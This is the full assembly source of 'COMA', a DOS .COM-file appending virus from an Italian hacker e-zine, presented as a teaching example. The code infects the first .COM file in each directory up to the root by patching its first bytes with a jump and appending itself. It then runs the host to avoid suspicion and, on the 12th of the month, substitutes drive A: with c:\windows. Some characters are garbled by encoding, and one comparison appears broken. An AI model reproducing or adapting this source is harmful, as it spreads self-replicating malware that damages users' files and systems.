;       COMA - di ElectroRipper                                                 ;                                                                               ; Questo Š un virus di esempio che ho scritto per l'e-zine, ma avrebbe          ; vita brevissima se diffuso per prima cosa perche' infetta solo files .COM     ; (che con wintendo stanno sparendo dalla circolazione) e non usa nessuna       ; tecnica per nascondersi.                                                      ; Quindi a solo scopo didattico per chi vuole imparare a fare un virus          ; di appending... il codice e' cosi' semplice da capire che quasi mi            ; vergogno :)                                                                   ; Infetta i files COM sovrascrivendo i primi bytes con un salto al codice       ; virale, che infetta il primo file COM della directory e poi                   ; comincia a risalire le directory infettando ogni volta il primo COM della     ; directory, fino ad arrivare alla directory principale. Poi torner…            ; nella directory di partenza. Infine ripristiner… i primi bytes del file       ; originale e lo eseguir… per non far nascere sospetti.                         ;                                                                               ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!       ; Non perdetevi il prossimo numero perchŠ spiegher• come infettare i file       ; .EXE di Windows95 (PE). Per ora se siete newbies cercate di capire come       ; funziona questo perchŠ vi assicuro che l'appending a eseguibili di            ; Windows Š mooooolto pi— difficile da capire.                                  ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!       ;                                                                               ;                                                                               ;                ElectroRipper                                                                                                                                                                                                                  codice segment 'code'                                                           org 100h                                                                        assume cs:codice,ds:codice,es:codice                                                                                                                            start proc far                                                                                                                                                  lunghezza equ fine-via   ; Cosi' sa la dimensione del virus                                                                                                     via:                                                                            db 90h, 90h, 90h, 90h, 90h                                                                                                                                      QUA:                                                                            CALL NOFINE                                                                     CALL FINE2                                                                      NOFINE:                                                                                                                                                                                                                                         PUSH cs                                                                         PUSH cs                                                                         POP ds                                                                          POP es                                                                                                                                                          CALL niente                                                                                                                                                     niente:                                                                                                                                                                                                                                         POP  BP                                                                         SUB  BP, OFFSET niente      ; Per avere il delta offset                                                                                                                                                                                         LEA SI,BP+iniziale                                                              MOV AH,47h                                                                      MOV DL,0                                                                        INT 21h                     ; Per ricordarsi da che directory Š partito                                                                                                                                                                                                                                                         infetta:                                                                                                                                                        MOV AH,4eh              ; Trova il primo file della directory con estensione    LEA DX,BP+comfile       ; .COM                                                  MOV CX,0000h                                                                    INT 21h                                                                                                                                                         MOV AH,3dh              ; Apre il file                                          MOV AL,00000010b                                                                MOV DX,009eh            ; (Il nome del file trovato sta nel DTA)                INT 21h                                                                         PUSH AX                                                                         POP BX                  ; L'handle ci serve in bx                                                                                                               LEA DI,BP+iprimitretmp                                                          LEA SI,BP+iprimitre                                                             MOV CX,3                                                                        REP MOVSB           ; Conserva i primi 3 bytes del file gia' infettato                                                                                          MOV AH,3fh                                                                      MOV CX,3                                                                        LEA DX,BP+iprimitre  ; Schiaffa i primi 3 bytes del file originale              INT 21h              ; nello spazio di iprimitre                                                                                                                                                                                                                                                                                MOV AX,4200h            ; Torniamo all'inizio del file                          MOV CX,0                                                                        MOV DX,0                                                                        INT 21h                                                                                                                                                         MOV AH,40h                                                                      MOV CX,1                                                                        LEA DX,BP+jump                                                                  INT 21h                 ; Scrive l'istruzione JMP                                                                                                                                                                                               LEA DI,BP+dimensione                                                            MOV SI,009ah                                                                    MOV CX,4                                                                        REP MOVSB                                                                                                                                                                                                                                       MOV AH,40h                                                                      MOV CX,2                                                                        LEA DX,BP+dimensione                                                            INT 21h                    ; I due byte che seguono il JMP (l'indirizzo)                                                                                                                                                                                                                                                                                                                                        MOV AX,4202h               ; Alla fine del file                                 MOV CX,0                                                                        MOV DX,0                                                                        INT 21h                                                                                                                                                                                                                                         MOV AH,40h                                                                      MOV CX,lunghezza        ; La dimensione del codice virale                       LEA DX,BP+via           ; Inizio del virus                                      INT 21h                 ; Scrive il virus                                                                                                                                                                                                       MOV AH,3Eh                 ; Ole' ! Chiudi il file                              INT 21h                                                                                                                                                                                                                                         LEA SI,BP+iprimitretmp                                                          LEA DI,BP+iprimitre                                                             MOV CX,3                                                                        REP MOVSB           ; Riprende i primi 3 bytes del file eseguito                                                                                                                                                                                MOV AH,2Ah                                                                      INT 21H                                                                         CMP DL,12                                                                       JE  bomba  ; Se Š il 12 del mese scatta la bomba....                            JMP nobomba                                                                     bomba:                                                                                                                                                          MOV AX,71AAh        ; La bomba in questione in realt… Š innocua e               MOV BH,0            ; pacifica, semplicemente sotto windows                     MOV BL,1            ; fa un subst all'unit… A:                                  LEA DX,BP+path      ; (per i lamer : vuol dire che quando l'utente cerca        INT 21h             ;  di accedere all'unit… in realt… accede al percorso                           ;  virtuale ad esso assegnato, in questo caso quando                            ;  si cerca di accedere al floppy disk in realt… si                             ;  finisce sempre in c:\windows)                                                                                                            nobomba:                                                                                                                                                                                                                                        LEA DX,BP+indietro                                                              MOV AH,3Bh                                                                      INT 21h             ; Va nella directory superiore                                                                                                                                                                                              LEA SI,BP+vediamo                                                               MOV AH,47h                                                                      MOV DL,0                                                                        INT 21h                                                                         LEA SI,BP+vediamo                                                               LODSB                                                                           CMP AL,''                                                                       JE ORABASTA         ; Se e' arrivato alla directory principale si ferma                                                                                                                                                                         JMP infetta         ; ...altrimenti infetta il primo .COM della directory                                                                                       orabasta:                                                                                                                                                       LEA DX,BP+iniziale  ; Ritorna alla directory dalla quale Š partito              MOV AH,3Bh                                                                      INT 21h                                                                                                                                                         LEA SI,BP+iprimitre     ; Rimette i primi 3 bytes del file                      MOV DI,100h             ; originale al loro posto (in memoria)                  MOV CX,3                                                                        REP MOVSB                                                                                                                                                                                                                                       LEA DI,BP+QUA                                                                   MOV AL,90h                                                                      MOV CX,3       ; Elimina la chiamata a NOFINE (cosi' il capostipite infetta     REP STOSB      ; una sola volta)                                                                                                                                                                                                                                                                                                MOV AX,100h                                                                     JMP AX            ; Ritorna al programma originale                                                                                                              FINE2:                                                                          MOV AX,4C00h                                                                    INT 21h           ; Il capostipite termina normalmente                                                                                                                                                                                          iniziale db 64 dup (?)                                                          vediamo db 64 dup (?)                                                           iprimitre db 3 dup (?)           ; Qua vanno a finire quei famosi bytes...      iprimitretmp db 3 dup(?)                                                        dimensione dw 2 dup (?)                                                         jump db 'é',0                       ; L'asci per l'istruzione JMP               comfile db '*.COM',0                                                            messaggio db 'COMA - di ElectroRipper'  ; Pubblicit…                            indietro db '..',0                                                              path db 'c:\windows',0                                                          fine:                   ; Ok! Qua finisce                                                                                                                                                                                                       start endp                                                                      codice ends                                                                     end via                                                                                                                                                         